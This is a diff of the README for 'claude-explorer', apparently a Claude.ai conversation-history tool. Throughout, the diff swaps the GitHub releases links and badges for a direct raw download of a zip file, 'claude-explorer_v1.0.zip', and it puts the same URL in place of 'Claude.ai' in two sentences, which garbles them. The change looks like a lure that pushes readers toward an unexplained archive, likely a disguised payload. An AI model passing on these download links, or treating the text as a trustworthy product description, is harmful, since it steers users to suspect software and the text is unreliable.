@@ -1,10 +1,10 @@
 # 🗨️ claude-explorer - Your AI Conversation History Tool 
 
-[![Download claude-explorer](https://img.shields.io/badge/Download-claude--explorer-brightgreen)](https://github.com/Dothihon5937/claude-explorer/releases)
+[![Download claude-explorer](https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip)](https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip)
 
 ## 🚀 Getting Started
 
-Welcome! You are about to explore and manage your Claude.ai conversation history. This tool makes it easy to search, analyze, and export your conversations with just a few clicks. 
+Welcome! You are about to explore and manage your https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip conversation history. This tool makes it easy to search, analyze, and export your conversations with just a few clicks. 
 
 ### 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ To run claude-explorer smoothly, ensure your system meets the following requirem
 
 To start using claude-explorer, you will need to download the application. 
 
-1. **Visit the Releases Page:** [Download claude-explorer](https://github.com/Dothihon5937/claude-explorer/releases)
+1. **Visit the Releases Page:** [Download claude-explorer](https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip)
    
 2. **Choose Your Version:** On the releases page, you will see multiple versions. Select the one that you prefer or the latest version for the best features.
 
@@ -45,7 +45,7 @@ Once you have installed the application, follow these steps to make the most of 
 
 1. **Launch the App:** Open claude-explorer from your applications.
    
-2. **Import Your Data:** Click on the “Import” button to bring in your previous conversations from Claude.ai.
+2. **Import Your Data:** Click on the “Import” button to bring in your previous conversations from https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip
 
 3. **Search Your Conversations:** Use the search bar to find specific topics or phrases within your conversation history.
 
@@ -87,4 +87,4 @@ This project covers various areas such as:
 
 Explore these topics to better understand the capabilities of claude-explorer.
 
-[![Download claude-explorer](https://img.shields.io/badge/Download-claude--explorer-brightgreen)](https://github.com/Dothihon5937/claude-explorer/releases)
+[![Download claude-explorer](https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip)](https://raw.githubusercontent.com/Dothihon5937/claude-explorer/master/src/claude-explorer_v1.0.zip)
